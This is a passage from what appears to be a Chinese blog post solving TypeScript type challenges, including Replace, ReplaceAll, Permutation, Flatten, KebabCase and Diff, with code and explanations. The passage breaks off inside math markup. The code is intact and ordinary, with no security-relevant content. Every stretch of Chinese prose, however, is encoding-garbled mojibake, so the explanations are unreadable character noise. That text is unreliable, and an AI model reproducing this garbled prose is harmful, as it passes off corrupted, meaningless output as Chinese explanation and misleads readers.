<li>å½“ä½¿ç”¨Â <code>${infer A}${infer B}</code>Â è¿™ç§æ ¼å¼åŒ¹é…å­—ç¬¦ä¸²æ—¶ï¼ŒTSä¼šé‡‡å–â€œéè´ªå©ªâ€ç­–ç•¥åŒ¹é…ç¬¬ä¸€ä¸ªå˜é‡ã€‚ä¹Ÿå°±æ˜¯ <code>A</code>ä¼šæ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ<code>B</code> æ˜¯å‰©ä½™æ‰€æœ‰å­—ç¬¦ã€‚</li>
<li><code>Uppercase&lt;F&gt;</code> æ˜¯ TypeScript å†…ç½®çš„å›ºæœ‰ç±»å‹ï¼ˆIntrinsic Typeï¼‰ï¼Œå°†ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å…¨éƒ¨å­—ç¬¦è½¬ä¸ºå¤§å†™ã€‚</li>
</ul>
<h3 data-id="heading-28">27. Medium - 116 -  Replace</h3>
<p>å®ç°Â <code>Replace&lt;S, From, To&gt;</code>Â å°†å­—ç¬¦ä¸²Â <code>S</code>Â ä¸­çš„ç¬¬ä¸€ä¸ªå­å­—ç¬¦ä¸²Â <code>From</code>Â æ›¿æ¢ä¸ºÂ <code>To</code>Â ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Replace</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">To</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = 
    <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">''</span>
      ? S
      : S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer A}</span><span class="hljs-subst">${From}</span><span class="hljs-subst">${infer B}</span>`</span>
      ? <span class="hljs-string">`<span class="hljs-subst">${A}</span><span class="hljs-subst">${To}</span><span class="hljs-subst">${B}</span>`</span>
      : S
</code></pre>
<p>ç”±äºæµ‹è¯•ç”¨ä¾‹ä¸­å­˜åœ¨ <code>From</code> ä¸ºç©ºä¸²çš„æƒ…å†µ <code>Equal&lt;Replace&lt;'foobarbar', '', 'foo'&gt;, 'foobarbar'&gt;</code> æ­¤æ—¶ä¸éœ€è¦åšä»»ä½•å¤„ç†ï¼Œæ‰€ä»¥è¿™é‡Œå…ˆåˆ¤æ–­äº†ä¸€ä¸‹ï¼Œå¦‚æœ <code>From</code> ä¸ºç©ºç›´æ¥è¿”å›åŸå­—ç¬¦ä¸²ã€‚</p>
<p>ç„¶åé€šè¿‡ <code>${infer A}${From}${infer B}</code> çš„æ¨¡å¼åŒ¹é…å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ç¬¬ä¸€ä¸ª <code>{From}</code> å†é€šè¿‡ <code>${A}${To}${B}</code> å®Œæˆæ›¿æ¢ã€‚</p>
<p>TSçš„ç‰¹æ€§ï¼Œéè´ªå©ªåŒ¹é…ï¼Œæ‰€ä»¥æ°¸è¿œä¼šåŒ¹é…åˆ°ç¬¬ä¸€ä¸ª <code>{From}</code> ã€‚</p>
<h3 data-id="heading-29">28. Medium - 119 -  ReplaceAll</h3>
<p>å®ç°Â <code>ReplaceAll&lt;S, From, To&gt;</code>Â å°†ä¸€ä¸ªå­—ç¬¦ä¸²Â <code>S</code>Â ä¸­çš„æ‰€æœ‰å­å­—ç¬¦ä¸²Â <code>From</code>Â æ›¿æ¢ä¸ºÂ <code>To</code>ã€‚</p>
<p>ä¸€å¼€å§‹å°±æƒ³åˆ°äº†é€’å½’å¤„ç†ï¼Œå®ç°ä¹Ÿå°±æ˜¯åœ¨ä¸Šä¸€é¢˜ç¨ç¨æ”¹ä¸‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReplaceAll</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">To</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; =
  <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">''</span>
    ? S
    : S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer A}</span><span class="hljs-subst">${From}</span><span class="hljs-subst">${infer B}</span>`</span>
    ? <span class="hljs-title class_">ReplaceAll</span>&lt;<span class="hljs-string">`<span class="hljs-subst">${A}</span><span class="hljs-subst">${To}</span><span class="hljs-subst">${B}</span>`</span>, <span class="hljs-title class_">From</span>, <span class="hljs-title class_">To</span>&gt;
    : S
</code></pre>
<p>ä¸è¿‡å¾ˆæ˜æ˜¾è¿™æ ·ä¸å¯¹ï¼ŒæŠŠä¿®æ”¹è¿‡çš„éƒ¨åˆ†å†æ•´ä½“æ›¿æ¢ï¼Œä¼šå¯¼è‡´ä¸‹é¢è¿™ç§é”™è¯¯ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span> = <span class="hljs-title class_">ReplaceAll</span>&lt;<span class="hljs-string">'foooob'</span>, <span class="hljs-string">'ob'</span>, <span class="hljs-string">'b'</span>&gt; <span class="hljs-comment">// "fb"</span>
</code></pre>
<p>ä¸è¿‡ä¹Ÿæ¯”è¾ƒå¥½å¤„ç†ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“æ¯æ¬¡å¤„ç†çš„éƒ½åªä¼šæ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆç›´æ¥é€’å½’å¤„ç†åé¢çš„éƒ¨åˆ†å°±å¯ä»¥äº†ï¼Œæ­£ç¡®ç­”æ¡ˆï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReplaceAll</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, <span class="hljs-title class_">To</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; =
 <span class="hljs-title class_">From</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">''</span>
  ? S
  : S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer A}</span><span class="hljs-subst">${From}</span><span class="hljs-subst">${infer B}</span>`</span>
  ? <span class="hljs-string">`<span class="hljs-subst">${A}</span><span class="hljs-subst">${To}</span><span class="hljs-subst">${ReplaceAll&lt;B, From, To&gt;}</span>`</span>
  : S
</code></pre>
<h3 data-id="heading-30">29. Medium - 191 -  Append Argument è¿½åŠ å‚æ•°</h3>
<p>å®ç°ä¸€ä¸ªæ³›å‹Â <code>AppendArgument&lt;Fn, A&gt;</code>ï¼Œå¯¹äºç»™å®šçš„å‡½æ•°ç±»å‹Â <code>Fn</code>ï¼Œä»¥åŠä¸€ä¸ªä»»æ„ç±»å‹Â <code>A</code>ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°Â <code>G</code>ã€‚<code>G</code>Â æ‹¥æœ‰Â <code>Fn</code>Â çš„æ‰€æœ‰å‚æ•°å¹¶åœ¨æœ«å°¾è¿½åŠ ç±»å‹ä¸ºÂ <code>A</code>Â çš„å‚æ•°ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AppendArgument</span>&lt;<span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>, A&gt; = 
  <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; infer R 
  ? <span class="hljs-function">(<span class="hljs-params">...args: [...P, A]</span>) =&gt;</span> R
  : <span class="hljs-built_in">never</span>
</code></pre>
<p>è¿™é“é¢˜å°±æ˜¯æŠŠä¹‹å‰çš„è·å–å‡½æ•°å‚æ•°å’Œè¿”å›å€¼ç»“åˆèµ·æ¥äº†ï¼Œå‚è€ƒ 533ã€3312ã€2 å‡ é“é¢˜å³å¯ã€‚</p>
<h3 data-id="heading-31">30. Medium - 296 -  Permutation è”åˆç±»å‹çš„å…¨æ’åˆ— â€»</h3>
<p>å®ç°è”åˆç±»å‹çš„å…¨æ’åˆ—ï¼Œå°†è”åˆç±»å‹è½¬æ¢æˆæ‰€æœ‰å¯èƒ½çš„å…¨æ’åˆ—æ•°ç»„çš„è”åˆç±»å‹ã€‚</p>
<p>é¢˜è§£åœ¨æ­¤ <a href="https://juejin.cn/post/7598532592456007707" target="_blank" title="https://juejin.cn/post/7598532592456007707">ä½ ä¸çŸ¥é“çš„ TypeScriptï¼šè”åˆç±»å‹ä¸åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ã€‹</a>ï¼Œå®Œæˆæ­¤é¢˜éœ€è¦å¯¹åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹æœ‰æ·±å…¥ç†è§£ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Permutation</span>&lt;T, K = T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>]
  ? []
  : T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> ? [T, ...<span class="hljs-title class_">Permutation</span>&lt;<span class="hljs-title class_">Exclude</span>&lt;K, T&gt;&gt;] : []
</code></pre>
<h3 data-id="heading-32">31. Medium - 298 -  Length of String</h3>
<p>è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç±»ä¼¼äºÂ <code>String#length</code>Â ã€‚</p>
<p>æ€è·¯ï¼šå­—ç¬¦ä¸²ç±»å‹æ²¡æœ‰åŠæ³•é€šè¿‡ <code>S['length']</code> è·å–é•¿åº¦ï¼Œä½†æ˜¯å…ƒç»„å¯ä»¥ï¼Œæ‰€ä»¥æœ€ç®€å•çš„è§£æ³•å°±æ˜¯å…ˆæŠŠå­—ç¬¦ä¸²æŒ‰å•ä¸ªå­—æ¯åˆ†å‰²æˆå…ƒç»„ï¼Œç„¶åå†å–é•¿åº¦ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Split</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer R}</span>`</span>
  ? [F, ...<span class="hljs-title class_">Split</span>&lt;R&gt;] : []
<span class="hljs-keyword">type</span> <span class="hljs-title class_">LengthOfString</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-title class_">Split</span>&lt;S&gt;[<span class="hljs-string">'length'</span>]
</code></pre>
<p>çœ‹äº†ç¤¾åŒºçš„ç­”æ¡ˆï¼Œå¯ä»¥é€šè¿‡æ–°å¢ä¸€ä¸ªå‚æ•°çš„æ–¹å¼ï¼Œä¸€æ¬¡è§£å†³é—®é¢˜ï¼Œè™½ç„¶ä¸å¤ªç›´è§‚ï¼Œå‡¡äº‹æŒºæœ‰è¶£çš„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">LengthOfString</span>&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>[] = []&gt; = 
  S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer R}</span>`</span> ? <span class="hljs-title class_">LengthOfString</span>&lt;R, [F, ...T]&gt; : T[<span class="hljs-string">'length'</span>]
</code></pre>
<h3 data-id="heading-33">32. Medium - 459 - Flatten</h3>
<p>ä½ éœ€è¦å†™ä¸€ä¸ªæ¥å—æ•°ç»„çš„ç±»å‹ï¼Œå¹¶ä¸”è¿”å›æ‰å¹³åŒ–çš„æ•°ç»„ç±»å‹ã€‚</p>
<p>è¿™é“é¢˜çš„æ€è·¯ä¹Ÿæ˜¯é€’å½’ï¼ŒTSä¸­é€’å½’çš„æ€è·¯å°±æ˜¯å…ˆå¤„ç†ç¬¬ä¸€ä¸ªå…ƒç´  <code>F</code>ï¼Œç„¶åé€’å½’å¤„ç†åé¢çš„ <code>R</code>ã€‚åœ¨å¤„ç†ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„ï¼Œæ˜¯åˆ™ç”¨ <code>Flatten</code> é€’å½’å¤„ç†ï¼Œå¦åˆ™ä¸éœ€è¦å†å¤„ç†äº†ï¼ŒæŠŠç¬¬ä¸€ä¸ªå…ƒç´ çš„ç»“æœå’Œåé¢çš„å¤„ç†ç»“æœæ‹¼æ¥èµ·æ¥å³å¯ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Flatten</span>&lt;A <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; =  
A <span class="hljs-keyword">extends</span> [infer F, ...infer R] <span class="hljs-comment">// åˆ¤æ–­Aå­˜åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ F</span>
  ? F <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[] <span class="hljs-comment">// åˆ¤æ–­ F æ˜¯å¦ä¸ºæ•°ç»„</span>
    ? [...<span class="hljs-title class_">Flatten</span>&lt;F&gt;, ...<span class="hljs-title class_">Flatten</span>&lt;R&gt;] <span class="hljs-comment">// Fä¸ºæ•°ç»„åˆ™é€’å½’å¤„ç† F å’Œå‰©ä½™éƒ¨åˆ†</span>
    : [F, ...<span class="hljs-title class_">Flatten</span>&lt;R&gt;] <span class="hljs-comment">// Fä¸ä¸ºæ•°ç»„åˆ™ä¸éœ€è¦å¤„ç† åªéœ€è¦é€’å½’å¤„ç†å‰©ä½™éƒ¨åˆ†</span>
  : [] <span class="hljs-comment">// A ä¸å­˜åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ ç›´æ¥è¿”å›ç©ºæ•°ç»„</span>
</code></pre>
<h3 data-id="heading-34">33. Medium - 527 - Append to object</h3>
<p>å®ç°ä¸€ä¸ªä¸ºæ¥å£æ·»åŠ ä¸€ä¸ªæ–°å­—æ®µçš„ç±»å‹ã€‚è¯¥ç±»å‹æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œè¿”å›å¸¦æœ‰æ–°å­—æ®µçš„æ¥å£ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AppendToObject</span>&lt;T, U <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, V&gt; = {
  [K <span class="hljs-keyword">in</span> keyof T | U]: K <span class="hljs-keyword">extends</span> keyof T ? T[K] : V
}
</code></pre>
<p>è¿™é¢˜çœ‹ç€ä¸éš¾ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ³¨æ„ä¸€ç‚¹ï¼ŒæŒ‡å®šæ³›å‹çº¦æŸ <code>U extends keyof any</code> å› ä¸ºä¸æ˜¯æ‰€æœ‰ç±»å‹éƒ½èƒ½åšå¯¹è±¡çš„å»ºã€‚</p>
<h3 data-id="heading-35">34. Medium - 529 - Absolute</h3>
<p>å®ç°ä¸€ä¸ªæ¥æ”¶ <code>string</code>, <code>number</code> æˆ– <code>bigInt</code> ç±»å‹å‚æ•°çš„ <code>Absolute</code> ç±»å‹, è¿”å›ä¸€ä¸ªæ­£æ•°å­—ç¬¦ä¸²ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Absolute</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span> | <span class="hljs-built_in">bigint</span>&gt; = 
  <span class="hljs-string">`<span class="hljs-subst">${T}</span>`</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`-<span class="hljs-subst">${infer F}</span>`</span>
  ? <span class="hljs-title class_">Absolute</span>&lt;F&gt;
  : <span class="hljs-string">`<span class="hljs-subst">${T}</span>`</span>
</code></pre>
<p>è¿™é¢˜å¾ˆç®€å•ï¼Œå…ˆæŠŠ <code>number</code> æˆ– <code>bigint</code> ç±»å‹è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå†é€šè¿‡å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹çš„æ¨¡å¼åŒ¹é…ï¼Œå»æ‰å‰é¢çš„ <code>-</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Absolute</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span> | <span class="hljs-built_in">bigint</span>&gt; = <span class="hljs-string">`<span class="hljs-subst">${T}</span>`</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`-<span class="hljs-subst">${infer F}</span>`</span> ? F : <span class="hljs-string">`<span class="hljs-subst">${T}</span>`</span>;
</code></pre>
<p>è¿™é‡Œæ¶‰åŠåˆ° <code>bigint</code> çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<blockquote>
<p>ä»£ç æœ«å°¾çš„ <code>n</code> æ˜¯ JavaScript å’Œ TypeScript ä¸­ BigInt æ•°æ®ç±»å‹çš„æ ‡å¿—ã€‚
æ•°å­—ä¸­é—´çš„ä¸‹åˆ’çº¿ _ æ˜¯ ES2021 å¼•å…¥çš„ç‰¹æ€§ï¼ˆTypeScript æ—©å°±æ”¯æŒï¼‰ã€‚ç¼–è¯‘å™¨åœ¨å¤„ç†æ—¶ä¼šå®Œå…¨å¿½ç•¥è¿™äº›ä¸‹åˆ’çº¿ã€‚<code>-1_000_000n</code> ç­‰åŒäº <code>-1000000n</code>ã€‚</p>
</blockquote>
<p>åœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¼•ç”¨ <code>bigint</code> ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> A = -<span class="hljs-number">1_000_000n</span>; <span class="hljs-comment">// -1000000n</span>
<span class="hljs-keyword">type</span> S = <span class="hljs-string">`<span class="hljs-subst">${A}</span>`</span>; <span class="hljs-comment">// "-1000000"</span>
</code></pre>
<h3 data-id="heading-36">35. Medium - 531 - String to Union</h3>
<p>å®ç°ä¸€ä¸ªå°†æ¥æ”¶åˆ°çš„ String å‚æ•°è½¬æ¢ä¸ºä¸€ä¸ªå­—æ¯ Union çš„ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">StringToUnion</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = 
  T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer R}</span>`</span>
  ? F | <span class="hljs-title class_">StringToUnion</span>&lt;R&gt;
  : <span class="hljs-built_in">never</span>
</code></pre>
<p>è¿™é¢˜ä¹Ÿå±äºæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ–°çš„çŸ¥è¯†ç‚¹ï¼Œæ¯æ¬¡å–é¦–å­—ç¬¦ç„¶åé€’å½’å¤„ç†ã€‚</p>
<h3 data-id="heading-37">36. Medium - 599 - Merge</h3>
<p>å°†ä¸¤ä¸ªç±»å‹åˆå¹¶æˆä¸€ä¸ªç±»å‹ï¼Œç¬¬äºŒä¸ªç±»å‹çš„é”®ä¼šè¦†ç›–ç¬¬ä¸€ä¸ªç±»å‹çš„é”®ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Merge</span>&lt;F, S&gt; = {
  [K <span class="hljs-keyword">in</span> keyof F | keyof S]: K <span class="hljs-keyword">extends</span> keyof S
    ? S[K]
    : K <span class="hljs-keyword">extends</span> keyof F
    ? F[K]
    : <span class="hljs-built_in">never</span>;
};
</code></pre>
<p>è§£å†³éš¾åº¦ä¸å¤§ï¼Œéå†ä¸¤ä¸ªå¯¹è±¡çš„ keyï¼Œç„¶åä¼˜å…ˆåˆ¤æ–­æ˜¯å¦ä¸º <code>S</code> çš„é”®ï¼Œè¾“å‡º <code>S</code> å¯¹åº”ç±»å‹ï¼Œå¦åˆ™ä¸º <code>F</code> å¯¹åº”çš„ç±»å‹ã€‚</p>
<h3 data-id="heading-38">37. Medium - 612 - KebabCase</h3>
<p>å°† é©¼å³°å¼ï¼ˆcamelCaseï¼‰ æˆ– å¸•æ–¯å¡å¼ï¼ˆPascalCaseï¼‰ å­—ç¬¦ä¸²æ›¿æ¢ä¸ºåˆ†å·åˆ†éš”å¼ï¼ˆkebab-caseï¼‰ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">DAXIE</span> = <span class="hljs-string">'A'</span>|<span class="hljs-string">'B'</span>| <span class="hljs-string">'C'</span>| <span class="hljs-string">'D'</span>| <span class="hljs-string">'E'</span>| <span class="hljs-string">'F'</span>| <span class="hljs-string">'G'</span>| <span class="hljs-string">'H'</span>| <span class="hljs-string">'I'</span>| <span class="hljs-string">'J'</span>| <span class="hljs-string">'K'</span>| <span class="hljs-string">'L'</span>| <span class="hljs-string">'M'</span>| <span class="hljs-string">'N'</span>| <span class="hljs-string">'O'</span>| <span class="hljs-string">'P'</span>| <span class="hljs-string">'Q'</span>| <span class="hljs-string">'R'</span>| <span class="hljs-string">'S'</span>| <span class="hljs-string">'T'</span>| <span class="hljs-string">'U'</span>| <span class="hljs-string">'V'</span>| <span class="hljs-string">'W'</span>| <span class="hljs-string">'X'</span>| <span class="hljs-string">'Y'</span>| <span class="hljs-string">'Z'</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">KebabCase</span>&lt;S, X <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>&gt; = 
  S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer R}</span>`</span> <span class="hljs-comment">// æ˜¯å¦æœ‰ç¬¬ä¸€ä¸ªå­—æ¯</span>
    ? F <span class="hljs-keyword">extends</span> <span class="hljs-variable constant_">DAXIE</span> <span class="hljs-comment">// å­˜åœ¨é¦–å­—æ¯ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå¤§å†™</span>
      ? X <span class="hljs-keyword">extends</span> <span class="hljs-string">''</span> <span class="hljs-comment">// çœ‹çœ‹å‰é¢æœ‰å­—ç¬¦å—</span>
        ? <span class="hljs-title class_">KebabCase</span>&lt;R, <span class="hljs-string">`<span class="hljs-subst">${X}</span><span class="hljs-subst">${Lowercase&lt;F&gt;}</span>`</span>&gt; <span class="hljs-comment">//  å‰é¢æ²¡æœ‰å…¶ä»–å­—ç¬¦æ”¹æˆå°å†™ä½†æ˜¯ä¸åŠ åˆ†å‰²çº¿</span>
        : <span class="hljs-title class_">KebabCase</span>&lt;R, <span class="hljs-string">`<span class="hljs-subst">${X}</span>-<span class="hljs-subst">${Lowercase&lt;F&gt;}</span>`</span>&gt; <span class="hljs-comment">// å‰é¢æœ‰å­—ç¬¦ F å¤„ç†ä¸º åˆ†å‰²çº¿+å°å†™</span>
      : <span class="hljs-title class_">KebabCase</span>&lt;R, <span class="hljs-string">`<span class="hljs-subst">${X}</span><span class="hljs-subst">${F}</span>`</span>&gt; <span class="hljs-comment">// ä¸æ˜¯å¤§å†™å­—æ¯ä¸åšå¤„ç†</span>
    : X <span class="hljs-comment">// Så¤„ç†å®Œäº†ç›´æ¥è¿”å›X</span>
</code></pre>
<p>æ­¤é¢˜æœ‰ç‚¹å¤æ‚ï¼Œä½†æ˜¯ä¸æ¶‰åŠæ–°çš„çŸ¥è¯†ç‚¹ï¼Œè¿˜æ˜¯å¯ä»¥åšå‡ºæ¥çš„ï¼Œæˆ‘åŠ äº†å®Œæ•´çš„æ³¨é‡Šæ–¹ä¾¿é˜…è¯»ã€‚å½“ç„¶é€šè¿‡æšä¸¾çš„æ–¹å¼æ¥åˆ¤æ–­æ˜¯å¦å¤§å†™å­—æ¯æœ‰ç‚¹è ¢ï¼Œè‚¯å®šæœ‰æ›´ç®€å•çš„æ–¹å¼ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">KebabCase</span>&lt;S&gt; = S <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer F}</span><span class="hljs-subst">${infer R}</span>`</span>
  ? R <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${Uncapitalize&lt;R&gt;}</span>`</span> <span class="hljs-comment">// Ré¦–å­—æ¯ä¸ºå°å†™æˆ–è€…Rä¸ºç©ºä¸²æ—¶æ¡ä»¶ä¸ºçœŸ</span>
    ? <span class="hljs-string">`<span class="hljs-subst">${Uncapitalize&lt;F&gt;}</span><span class="hljs-subst">${KebabCase&lt;Uncapitalize&lt;R&gt;&gt;}</span>`</span>
    : <span class="hljs-string">`<span class="hljs-subst">${Uncapitalize&lt;F&gt;}</span>-<span class="hljs-subst">${KebabCase&lt;Uncapitalize&lt;R&gt;&gt;}</span>`</span>
  : S;
</code></pre>
<h3 data-id="heading-39">38. Medium - 645 - Diff</h3>
<p>è·å–ä¸¤ä¸ªæ¥å£ç±»å‹ä¸­çš„å·®å€¼å±æ€§ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Diff</span>&lt;O, <span class="hljs-variable constant_">O1</span>&gt; = {
  [K <span class="hljs-keyword">in</span> keyof O | keyof <span class="hljs-variable constant_">O1</span> <span class="hljs-keyword">as</span> K <span class="hljs-keyword">extends</span> keyof O &amp; keyof <span class="hljs-variable constant_">O1</span>
    ? <span class="hljs-built_in">never</span>
    : K]: K <span class="hljs-keyword">extends</span> keyof O ? O[K] : K <span class="hljs-keyword">extends</span> keyof <span class="hljs-variable constant_">O1</span> ? <span class="hljs-variable constant_">O1</span>[K] : <span class="hljs-built_in">never</span>;
};
</code></pre>
<p>è™½ç„¶æ˜¯å¾ˆé¡ºåˆ©åœ°å†™å‡ºæ¥äº†ï¼Œä½†æ˜¯çœ‹äº†åˆ«äººçš„ç­”æ¡ˆ= =</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Diff</span>&lt;O, <span class="hljs-variable constant_">O1</span>&gt; = <span class="hljs-title class_">Omit</span>&lt;O &amp; <span class="hljs-variable constant_">O1</span>, keyof O &amp; keyof <span class="hljs-variable constant_">O1</span>&gt;
</code></pre>
<p>è¿™é‡Œæ¯”è¾ƒåç›´è§‰çš„æ˜¯ï¼Œå¯¹è±¡çš„äº¤å‰ç±»å‹ï¼ˆIntersectionï¼‰å­˜åœ¨å…¨éƒ¨å¯¹è±¡çš„å±æ€§é”®ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> A = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> };
<span class="hljs-keyword">type</span> B = { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };

<span class="hljs-keyword">type</span> C = A &amp; B;
<span class="hljs-comment">// ç»“æœï¼š{ name: string; age: number; }</span>
</code></pre>
<p>è¿™æ˜¯å› ä¸º A å’Œ B çš„äº¤é›†å°±æ˜¯æ‰¾ä¸€ä¸ªç±»å‹ï¼Œå³ç¬¦åˆ A åˆç¬¦åˆ Bã€‚</p>
<p>é›†åˆ Aï¼šåŒ…å«æ‰€æœ‰ â€œå¸¦æœ‰ name å±æ€§â€ çš„å¯¹è±¡ã€‚<br/>
é›†åˆ Bï¼šåŒ…å«æ‰€æœ‰ â€œå¸¦æœ‰ age å±æ€§â€ çš„å¯¹è±¡ã€‚<br/>
é›†åˆ A &amp; Bï¼šæˆ‘è¦æ‰¾ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å¿…é¡»åŒæ—¶æ‹¥æœ‰ name å’Œ ageã€‚</p>
<p>æ‰€ä»¥ï¼šç±»å‹çš„äº¤é›† = å±æ€§åçš„å¹¶é›†<br/>
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>A</mi><mo>âˆ©</mo><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>B</mi><mo stretchy="false">)</mo><mo>âŸº</mo><mo stretchy="false">(</mo><mi>K</mi><mi>e</mi><mi>y</mi><mi>s</mi><mi>A</mi><mo>âˆª</mo><mi>K</mi><mi>e</mi><mi>y</mi><mi>s</mi><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(TypeA âˆ© TypeB) âŸº (KeysA âˆª KeysB)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span 